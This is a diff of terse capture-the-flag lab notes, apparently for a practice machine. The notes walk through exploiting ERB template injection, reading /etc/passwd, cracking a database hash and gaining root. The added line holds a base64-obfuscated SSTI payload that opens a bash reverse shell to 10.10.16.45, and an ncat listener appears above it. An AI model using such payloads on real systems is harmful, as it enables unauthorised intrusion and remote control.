@@ -21,7 +21,7 @@ ncat -lvnp 9001 > backup.7z
   check calculator feature on the web, intercept the request and enum with SSTI payloads.
   find that ERB syntax are allowes and potentially to exploit the machine
   try ping, and read /etc/passwd, don't forget to encode the script to URL
-  some case, the script need to encode with base64 first. got the shell
+  some case, the script need to encode with base64 first ; <%=system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40NS85MDkwIDA+JjE=|base64 -d|bash");%>1, got the shell
   find db backup file, read using "strings", got the hash SHA-256, crack it using hashcat. got user then root!
 
 #v Headless Machine:
